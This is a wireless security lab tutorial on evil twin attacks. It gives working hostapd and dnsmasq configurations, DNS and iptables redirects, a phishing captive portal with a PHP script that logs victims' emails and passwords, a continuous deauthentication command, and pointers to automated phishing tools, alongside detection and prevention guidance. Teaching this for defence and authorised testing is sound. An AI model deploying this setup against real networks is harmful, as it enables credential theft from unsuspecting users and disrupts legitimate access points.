# Lab 07: Evil Twin Attacks

Creating rogue access points to intercept traffic and harvest credentials.

```
+===============================================================+
|                    EVIL TWIN ATTACKS                           |
+===============================================================+
|  Difficulty: Advanced        Duration: 1.5 hours              |
|  Hardware: 2x WiFi Adapters  Type: Practical                  |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                    CRITICAL LEGAL WARNING                            |
+=====================================================================+
|  Evil Twin attacks are ILLEGAL without explicit authorization.      |
|                                                                      |
|  Creating a rogue access point that impersonates another network:   |
|  - Violates computer fraud and abuse laws                           |
|  - May constitute wire fraud                                        |
|  - Can violate wiretapping laws                                     |
|  - May interfere with legitimate network operations                 |
|                                                                      |
|  ONLY perform these attacks:                                        |
|  - In completely ISOLATED lab environments                          |
|  - On YOUR OWN networks with YOUR OWN devices                      |
|  - With full understanding of legal implications                    |
|                                                                      |
|  Misuse can result in federal criminal charges, substantial         |
|  fines, and imprisonment.                                           |
+=====================================================================+
```

## Learning Objectives

By the end of this lab, you will:

1. Understand how evil twin attacks work
2. Set up a rogue access point with hostapd
3. Configure DHCP and DNS with dnsmasq
4. Create a captive portal for credential harvesting
5. Combine deauthentication with evil twin
6. Understand defensive measures against rogue APs

## Prerequisites

- Completed Labs 03-06 (Reconnaissance through Deauth)
- Two WiFi adapters (one for AP, one for deauth/monitoring)
- Kali Linux with required tools installed
- Isolated test environment

## Hardware Requirements

```
Required Hardware:

┌─────────────────────────────────────────────────────────────────┐
│                    DUAL ADAPTER SETUP                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ADAPTER 1: Rogue AP                                            │
│  ├── Must support AP mode                                       │
│  ├── Recommended: Alfa AWUS036ACH, AWUS036ACM                  │
│  └── Used to broadcast fake network                             │
│                                                                  │
│  ADAPTER 2: Deauth/Monitor                                      │
│  ├── Must support monitor mode + injection                      │
│  ├── Recommended: TP-Link TL-WN722N v1, Alfa AWUS036NHA        │
│  └── Used for deauth and/or internet uplink                     │
│                                                                  │
│  Note: Internal WiFi can sometimes serve as one adapter         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Verify AP Mode Support:**
```bash
iw list | grep -A 10 "Supported interface modes"
# Look for:
#   * AP
```

## Theory: How Evil Twin Attacks Work

### Attack Overview

```
Evil Twin Attack Flow:

┌─────────────────────────────────────────────────────────────────────┐
│                         ATTACK SCENARIO                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│   1. RECONNAISSANCE                                                  │
│      Attacker discovers target network "CoffeeShop_WiFi"            │
│                                                                      │
│   2. EVIL TWIN CREATION                                             │
│      Attacker creates identical "CoffeeShop_WiFi" AP                │
│      (Same SSID, possibly same MAC, open or matching security)      │
│                                                                      │
│   3. DEAUTHENTICATION                                               │
│      Attacker floods legitimate AP with deauth frames               │
│      Victims disconnect from real network                            │
│                                                                      │
│   4. VICTIM CONNECTION                                               │
│      Victims auto-reconnect to strongest signal                     │
│      Evil twin often has stronger signal (closer to victims)        │
│                                                                      │
│   5. TRAFFIC INTERCEPTION                                           │
│      All victim traffic flows through attacker                      │
│      Credentials can be captured via fake portals                   │
│      HTTPS can be stripped (sslstrip) or proxied                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Attack Diagram

```
                    EVIL TWIN ATTACK

     LEGITIMATE AP                        EVIL TWIN (Attacker)
    "CoffeeShop_WiFi"                    "CoffeeShop_WiFi"
          │                                      │
          │                                      │
          │ ◄──── Deauth ────────────────────── │
          │       (Kicks off victims)            │
          │                                      │
          │                                      │
          X                                      │
      (Unusable)                                 │
                                                 │
                                                 │
          ┌──────────────────────────────────────┤
          │                                      │
          ▼                                      │
       VICTIM                                    │
          │                                      │
          └──────────────────────────────────────┘
                 Connects to Evil Twin
                 (Stronger signal)


Traffic Flow Through Evil Twin:

    VICTIM ────► EVIL TWIN ────► INTERNET
                     │
                     │ Capture credentials
                     │ Inject content
                     │ Downgrade HTTPS
                     ▼
                 ATTACKER
```

### Captive Portal Attack

```
Captive Portal Credential Harvesting:

1. Victim connects to evil twin
2. Victim opens browser
3. All HTTP requests redirected to fake portal
4. Portal mimics login page (router, WiFi auth, etc.)
5. Victim enters credentials
6. Attacker captures credentials
7. (Optional) Redirect to internet

┌─────────────────────────────────────────────────────┐
│              FAKE CAPTIVE PORTAL                     │
├─────────────────────────────────────────────────────┤
│                                                      │
│      ╔════════════════════════════════════════╗     │
│      ║      CoffeeShop WiFi Login             ║     │
│      ╠════════════════════════════════════════╣     │
│      ║                                        ║     │
│      ║  Username: [_________________]         ║     │
│      ║                                        ║     │
│      ║  Password: [_________________]         ║     │
│      ║                                        ║     │
│      ║  Email:    [_________________]         ║     │
│      ║                                        ║     │
│      ║      [  Connect to WiFi  ]             ║     │
│      ║                                        ║     │
│      ╚════════════════════════════════════════╝     │
│                                                      │
│  All entered credentials sent to attacker!          │
│                                                      │
└─────────────────────────────────────────────────────┘
```

## Step-by-Step Instructions

### Step 1: Identify Network Interfaces

```bash
# List wireless interfaces
iwconfig

# Identify which interface will be:
# - wlan0: Rogue AP
# - wlan1: Deauth/monitoring

# Verify AP mode support
iw list | grep -A 10 "Supported interface modes"
```

### Step 2: Configure hostapd (Rogue AP)

```bash
# Create hostapd configuration
sudo nano /etc/hostapd/hostapd-evil.conf
```

**hostapd Configuration:**
```ini
# Evil Twin Configuration
interface=wlan0
driver=nl80211
ssid=TestNetwork
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
# This creates an OPEN network

# For WPA2 (requires knowing password):
# wpa=2
# wpa_passphrase=TestPassword
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
```

### Step 3: Configure dnsmasq (DHCP/DNS)

```bash
# Create dnsmasq configuration
sudo nano /etc/dnsmasq-evil.conf
```

**dnsmasq Configuration:**
```ini
# Interface to listen on
interface=wlan0
bind-interfaces

# DHCP settings
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h

# Set gateway and DNS
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# DNS - redirect all to our IP (for captive portal)
address=/#/192.168.1.1

# Log queries
log-queries
log-facility=/var/log/dnsmasq-evil.log
```

### Step 4: Set Up Network Interface

```bash
# Bring down the interface
sudo ip link set wlan0 down

# Assign IP address
sudo ip addr add 192.168.1.1/24 dev wlan0

# Bring interface up
sudo ip link set wlan0 up

# Verify
ip addr show wlan0
```

### Step 5: Enable IP Forwarding

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Set up NAT (if providing internet access)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

### Step 6: Start Evil Twin AP

```bash
# Start dnsmasq
sudo dnsmasq -C /etc/dnsmasq-evil.conf

# Start hostapd
sudo hostapd /etc/hostapd/hostapd-evil.conf

# Verify AP is broadcasting
# Check from another device that "TestNetwork" appears
```

### Step 7: Create Captive Portal (Optional)

**Simple PHP Captive Portal:**

```bash
# Create web directory
sudo mkdir -p /var/www/html/portal

# Create login page
sudo nano /var/www/html/portal/index.html
```

```html
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - TestNetwork</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        h1 { color: #333; margin-bottom: 30px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Welcome to TestNetwork</h1>
        <p>Please enter your email to access WiFi</p>
        <form action="capture.php" method="POST">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password (optional)">
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
</body>
</html>
```

**Credential Capture Script:**

```bash
sudo nano /var/www/html/portal/capture.php
```

```php
<?php
// Log credentials to file
$log_file = '/var/log/captured_creds.txt';
$timestamp = date('Y-m-d H:i:s');
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

$log_entry = "[$timestamp] IP: $ip | Email: $email | Password: $password\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirect to indicate success
header('Location: success.html');
exit;
?>
```

**Configure iptables for Captive Portal:**

```bash
# Redirect all HTTP traffic to our portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Start Apache/Nginx
sudo systemctl start apache2
# or
sudo systemctl start nginx
```

### Step 8: Deauthentication (Force Victims to Evil Twin)

```bash
# On second adapter (wlan1), enable monitor mode
sudo airmon-ng start wlan1

# Continuously deauth legitimate AP
sudo aireplay-ng -0 0 -a [REAL_AP_BSSID] wlan1mon

# Victims will disconnect and may connect to your evil twin
```

## Automated Tools

### Fluxion

```bash
# Clone Fluxion
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion

# Run Fluxion
sudo ./fluxion.sh

# Fluxion automates:
# - Target selection
# - Evil twin creation
# - Handshake capture
# - Captive portal with WPA password prompt
# - Password verification against handshake
```

### Wifiphisher

```bash
# Install wifiphisher
sudo apt install wifiphisher

# Run wifiphisher
sudo wifiphisher

# Wifiphisher provides:
# - Multiple phishing scenarios
# - Automated deauth
# - Credential capture
# - Plugin system
```

### Bettercap

```bash
# Start bettercap
sudo bettercap

# Create evil twin
wifi.recon on
wifi.ap

# Or use caplets for automation
sudo bettercap -caplet evil_twin.cap
```

## Lab Exercises

### Exercise 1: Basic Evil Twin

1. Create an open evil twin of your test network
2. Connect your test device to it
3. Verify you can see the traffic

### Exercise 2: Captive Portal

1. Set up a captive portal with credential harvesting
2. Connect test device and "log in"
3. Verify credentials are captured

### Exercise 3: Combined Attack

1. Set up evil twin of your test network
2. Use deauth to kick devices from legitimate AP
3. Capture handshakes when they reconnect to yours

### Exercise 4: Detection

1. How would you detect an evil twin?
2. What characteristics differentiate legitimate from rogue AP?

## Defensive Measures

### For Network Administrators

```
Evil Twin Defense Strategies:

╔══════════════════════════════════════════════════════════════════╗
║                    DETECTION METHODS                              ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  1. WIRELESS IDS/IPS                                              ║
║     ├── Deploy WIPS solutions (Cisco, Aruba)                     ║
║     ├── Monitor for duplicate SSIDs                              ║
║     ├── Alert on unauthorized MAC addresses                      ║
║     └── Detect suspicious AP behavior                            ║
║                                                                   ║
║  2. CERTIFICATE VALIDATION                                        ║
║     ├── Use WPA2/3-Enterprise with certificates                  ║
║     ├── Clients verify AP certificate                            ║
║     └── Evil twin cannot present valid certificate               ║
║                                                                   ║
║  3. 802.1X AUTHENTICATION                                         ║
║     ├── Requires RADIUS authentication                           ║
║     ├── Mutual authentication                                    ║
║     └── Much harder to impersonate                               ║
║                                                                   ║
╠══════════════════════════════════════════════════════════════════╣
║                    PREVENTION METHODS                             ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  1. PMF (802.11w)                                                 ║
║     └── Prevents deauth attacks that drive users to evil twin    ║
║                                                                   ║
║  2. WPA3                                                          ║
║     └── Mandatory PMF, SAE key exchange                          ║
║                                                                   ║
║  3. NETWORK SEGMENTATION                                          ║
║     └── Limit what's accessible even if compromised              ║
║                                                                   ║
║  4. USER EDUCATION                                                 ║
║     ├── Don't connect to open networks                           ║
║     ├── Verify HTTPS on sensitive sites                          ║
║     └── Be suspicious of login portals                           ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

### For Users

```
Protecting Yourself from Evil Twins:

1. Disable auto-connect to known networks
2. Forget networks you don't use regularly
3. Use VPN on untrusted networks
4. Verify HTTPS certificates
5. Be suspicious of captive portals asking for sensitive info
6. Check if network should be open or password-protected
7. Use cellular data for sensitive transactions
```

## Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| "AP won't start" | Interface busy | Stop NetworkManager, kill conflicting processes |
| "No DHCP lease" | dnsmasq not running | Check dnsmasq status, verify config |
| "Clients won't connect" | Channel mismatch | Match channel to legitimate AP |
| "No internet on evil twin" | IP forwarding disabled | Enable forwarding, check NAT rules |
| "Captive portal not showing" | DNS/redirect issues | Verify iptables rules, DNS config |

## Knowledge Check

1. Why do clients connect to evil twins?
2. What is the purpose of deauthentication in this attack?
3. How does WPA2-Enterprise protect against evil twins?
4. What information can an attacker capture through an evil twin?
5. How can 802.11w (PMF) help prevent evil twin attacks?

<details>
<summary>Answers</summary>

1. Clients often auto-connect to strongest signal with matching SSID, without verifying AP identity
2. Deauth disconnects clients from legitimate AP, making them search for network and potentially connect to evil twin
3. WPA2-Enterprise uses certificates - client verifies AP certificate, evil twin cannot present valid certificate
4. All unencrypted traffic, credentials from captive portals, potentially downgraded HTTPS traffic
5. PMF prevents the deauth attacks used to force clients off legitimate AP onto evil twin

</details>

## Summary

In this lab, you learned:

1. **Evil Twin Concept**: Impersonating legitimate APs
2. **Setup Components**: hostapd, dnsmasq, web server
3. **Captive Portals**: Credential harvesting techniques
4. **Combined Attacks**: Deauth + Evil Twin
5. **Tools**: Fluxion, Wifiphisher, Bettercap
6. **Defenses**: WIPS, WPA-Enterprise, PMF, user education

## Ethical Considerations

```
╔══════════════════════════════════════════════════════════════════╗
║                    RESPONSIBLE DISCLOSURE                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  If you discover a network vulnerable to evil twin attacks:       ║
║                                                                   ║
║  1. Document the vulnerability clearly                            ║
║  2. Report to network administrator                               ║
║  3. Provide remediation recommendations                           ║
║  4. DO NOT exploit against real users                             ║
║  5. Allow time for remediation before any disclosure              ║
║                                                                   ║
║  Remember: Skills learned here are for DEFENSE and authorized    ║
║  testing only. Misuse is criminal and unethical.                 ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

## Next Lab

Proceed to [Lab 08: Bluetooth Security](../08-bluetooth-security/) to explore vulnerabilities in Bluetooth technology.

## References

- [Hostapd Documentation](https://w1.fi/hostapd/)
- [dnsmasq Manual](https://thekelleys.org.uk/dnsmasq/doc.html)
- [WiFi Alliance Security](https://www.wi-fi.org/discover-wi-fi/security)
- [NIST Wireless Security Guide](https://csrc.nist.gov/publications/detail/sp/800-153/final)

---

**Flag:** `FLAG{3v1l_tw1n_pwn3d}`
